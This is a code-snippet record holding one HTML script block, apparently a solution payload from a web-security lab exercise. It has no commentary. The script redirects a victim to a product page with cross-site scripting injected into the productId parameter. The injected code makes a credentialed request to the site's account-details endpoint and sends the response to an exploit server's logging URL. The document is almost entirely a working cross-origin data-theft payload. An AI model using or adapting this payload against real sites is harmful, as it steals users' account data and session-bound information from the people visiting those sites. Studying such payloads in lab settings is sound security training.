---
id: 536ba1f2-5473-4204-9d7a-632afe19e5f6
type: code
language: ''
verified: false
created_at: '2020-08-17T09:40:24.069229+00:00'
updated_at: '2023-05-29T16:48:53.365139+00:00'
---

# Code Snippet 536ba1f2

```
<script>
   document.location="http://stock.$your-lab-url/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://$your-lab-url/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://$exploit-server-url/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
</script>
```
